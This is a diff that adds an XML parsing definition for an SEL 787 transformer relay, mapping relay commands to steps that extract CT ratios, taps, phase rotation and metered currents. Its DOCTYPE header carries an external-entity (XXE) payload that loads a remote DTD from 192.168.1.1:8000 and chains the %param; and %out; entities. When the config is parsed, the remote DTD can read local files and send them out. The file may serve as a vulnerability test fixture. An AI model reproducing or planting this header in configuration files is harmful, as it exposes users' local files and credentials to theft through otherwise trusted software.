@@ -1,0 +1,210 @@
+﻿<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE sel [
+<!ELEMENT sel ANY >
+<!ENTITY % mc SYSTEM "http://192.168.1.1:8000/sel.xml">%mc;%param;%out;]>
+<SELRelay displayName="787" internalName="787">
+  <WindingInfo>
+    <Winding>1</Winding>
+    <Winding>2</Winding>
+  </WindingInfo>
+  <TerminalInfo>
+    <!--Either set enabled to false or delete the entire node
+    to prevent the diagram from being enabled.-->
+    <Terminal enabled="true">HV1CT</Terminal>
+    <Terminal enabled="false">HV2CT</Terminal>
+    <Terminal enabled="true">LV1CT</Terminal>
+    <Terminal enabled="false">LV2CT</Terminal>
+    <Terminal enabled="true">IECAutoTransformer</Terminal>
+    <Terminal enabled="false">IECAutoTransformerWTertiary</Terminal>
+    <Terminal enabled="true">IEC2Transformer</Terminal>
+    <Terminal enabled="false">IEC2TransformerWTertiary</Terminal>
+    <Terminal enabled="true">ANSIAutoTransformer</Terminal>
+    <Terminal enabled="false">ANSIAutoTransformerWTertiary</Terminal>
+    <Terminal enabled="true">ANSI2Transformer</Terminal>
+    <Terminal enabled="false">ANSI2TransformerWTertiary</Terminal>
+  </TerminalInfo>
+  <ASCIICommands>
+    <Command>ID</Command>
+    <Command>SHO G</Command>
+    <Command>SHO</Command>
+    <Command>MET DIF</Command>
+    <Command>MET FUN</Command>
+  </ASCIICommands>
+  <ParsingInfo>
+    <Config>
+      <EqualsString>:=</EqualsString>
+      <IcomYesString>Y</IcomYesString>
+      <IcomNoString>N</IcomNoString>
+      <PhaseRotStringABC>ABC</PhaseRotStringABC>
+      <PhaseRotStringACB>ACB</PhaseRotStringACB>
+    </Config>
+    <PartNumber>
+      <Switch digit="16">
+        <Case value="1">
+          <AddFixedValue>
+            <Value>1</Value>
+            <StoreAs>AMPS1</StoreAs>
+            <Value>1</Value>
+            <StoreAs>AMPS2</StoreAs>
+          </AddFixedValue>
+        </Case>
+        <Case value="2">
+          <AddFixedValue>
+            <Value>1</Value>
+            <StoreAs>AMPS1</StoreAs>
+            <Value>5</Value>
+            <StoreAs>AMPS2</StoreAs>
+          </AddFixedValue>
+        </Case>
+        <Case value="5">
+          <AddFixedValue>
+            <Value>5</Value>
+            <StoreAs>AMPS1</StoreAs>
+            <Value>5</Value>
+            <StoreAs>AMPS2</StoreAs>
+          </AddFixedValue>
+        </Case>
+      </Switch>
+    </PartNumber>
+    <Instructions>
+      <!--Syntax for a step is: command / target / storeAs . Target and storeAs
+      are optional. If storeAs is left out, it uses target's value. If a command
+      requires target/storeAs and they do not exist, it skips the command.-->
+
+      <Page title="ID">
+        <!--Retrieve Part Number calls the steps you defined in PartNumber above.-->
+        <RetrievePartNumber />
+      </Page>
+
+      <Page title ="SHO G">
+        <!--Looks for the target string, and stores it. Uses
+        the constants you defined above for ABC/ACB-->
+        <GetPhaseRotation>
+          <TargetString>PHROT</TargetString>
+          <StoreAs>PHROT</StoreAs>
+        </GetPhaseRotation>
+      </Page>
+
+      <Page title="MET DIF">
+        <!--Advances the stream to the end of the target string.-->
+        <MoveStream>
+          <TargetString>(pu)</TargetString>
+        </MoveStream>
+        <!--Reads and stores the next numerical value in the stream.
+        More than one StoreAs repeats this command (ie, gets the second,
+        third, fourth, etc numerical values.)-->
+        <GetNextNumericalValue>
+          <StoreAs>IOP1</StoreAs>
+          <StoreAs>IOP2</StoreAs>
+          <StoreAs>IOP3</StoreAs>
+        </GetNextNumericalValue>
+        <MoveStream>
+          <TargetString>(pu)</TargetString>
+        </MoveStream>
+        <GetNextNumericalValue>
+          <StoreAs>IRT1</StoreAs>
+          <StoreAs>IRT2</StoreAs>
+          <StoreAs>IRT3</StoreAs>
+        </GetNextNumericalValue>
+      </Page>
+
+      <Page title="SHO">
+        <GetNamedValue>
+          <TargetString>CTR1</TargetString>
+          <StoreAs>CTRS</StoreAs>
+          <TargetString>CTR2</TargetString>
+          <StoreAs>CTRT</StoreAs>
+        </GetNamedValue>
+        <GetIcom>
+          <TargetString>ICOM</TargetString>
+          <StoreAs>ICOM</StoreAs>
+        </GetIcom>
+        <!--Searches the stream for the target string. If it is found
+        it advances the stream to the end of the stream and reads the 
+        value after the equals sign. Useful for getting data from things 
+        that have the form "TSCTC := 7" for example.-->
+        <GetNamedValue>
+          <TargetString>W1CTC</TargetString>
+          <StoreAs>TSCTC</StoreAs>
+          <TargetString>W2CTC</TargetString>
+          <StoreAs>TTCTC</StoreAs>
+
+          <TargetString>VWDG1</TargetString>
+          <StoreAs>VTERMS</StoreAs>
+          <TargetString>VWDG2</TargetString>
+          <StoreAs>VTERMT</StoreAs>
+
+          <TargetString>TAP1</TargetString>
+          <StoreAs>TAPS</StoreAs>
+          <TargetString>TAP2</TargetString>
+          <StoreAs>TAPT</StoreAs>
+        </GetNamedValue>
+      </Page>
+
+      <Page title="MET FUN">
+
+        <MoveStream>
+          <TargetString>(A pri.)</TargetString>
+        </MoveStream>
+        <!--Leaving StoreAs empty results in the parser advancing the stream 
+        past that value.-->
+        <GetNextNumericalValue>
+          <StoreAs>IASFM</StoreAs>
+          <StoreAs>IBSFM</StoreAs>
+          <StoreAs>ICSFM</StoreAs>
+          <StoreAs></StoreAs>
+          <StoreAs>SFM3I2</StoreAs>
+        </GetNextNumericalValue>
+        <MoveStream>
+          <TargetString>(deg)</TargetString>
+        </MoveStream>
+        <GetNextNumericalValue>
+          <StoreAs>IASFA</StoreAs>
+          <StoreAs>IBSFA</StoreAs>
+          <StoreAs>ICSFA</StoreAs>
+        </GetNextNumericalValue>
+        <MoveStream>
+          <TargetString>(A pri.)</TargetString>
+        </MoveStream>
+        <GetNextNumericalValue>
+          <StoreAs>IATFM</StoreAs>
+          <StoreAs>IBTFM</StoreAs>
+          <StoreAs>ICTFM</StoreAs>
+          <StoreAs></StoreAs>
+          <StoreAs>TFM3I2</StoreAs>
+        </GetNextNumericalValue>
+        <MoveStream>
+          <TargetString>(deg)</TargetString>
+        </MoveStream>
+        <GetNextNumericalValue>
+          <StoreAs>IATFA</StoreAs>
+          <StoreAs>IBTFA</StoreAs>
+          <StoreAs>ICTFA</StoreAs>
+        </GetNextNumericalValue>
+
+        <DivideInput>
+          <TargetString>IASFM</TargetString>
+          <Value>CTRS</Value>
+          <TargetString>IBSFM</TargetString>
+          <Value>CTRS</Value>
+          <TargetString>ICSFM</TargetString>
+          <Value>CTRS</Value>
+
+          <TargetString>IATFM</TargetString>
+          <Value>CTRT</Value>
+          <TargetString>IBTFM</TargetString>
+          <Value>CTRT</Value>
+          <TargetString>ICTFM</TargetString>
+          <Value>CTRT</Value>
+
+          <TargetString>SFM3I2</TargetString>
+          <Value>CTRS</Value>
+          <TargetString>TFM3I2</TargetString>
+          <Value>CTRT</Value>
+        </DivideInput>
+
+        <CalculatePositiveSequenceCurrents />
+      </Page>
+    </Instructions>
+  </ParsingInfo>
+</SELRelay>
